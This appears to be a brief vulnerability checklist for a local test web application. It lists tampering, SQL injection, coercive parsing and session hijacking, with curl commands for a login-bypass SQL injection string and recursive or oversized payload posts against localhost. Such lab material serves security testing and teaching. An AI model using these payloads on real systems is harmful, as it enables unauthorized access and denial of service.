Vulnerabilities:
 
0. Sensitive info saved unencrypted

1. Parameters tampering
 - Body params tampering
 - Cookie tampering 

2. SQL Injection
    curl --data "email=a' OR '1'='1&password=a' OR '1'='1" http://localhost:3000/sessions.json

3. Coercive Parsing
 - Recursive Payloads
    curl --data @recursive.txt http://localhost:3000/sessions.json
 - Oversized Payloads
    curl --data @oversized.txt http://localhost:3000/sessions.json

4. Session Hijacking

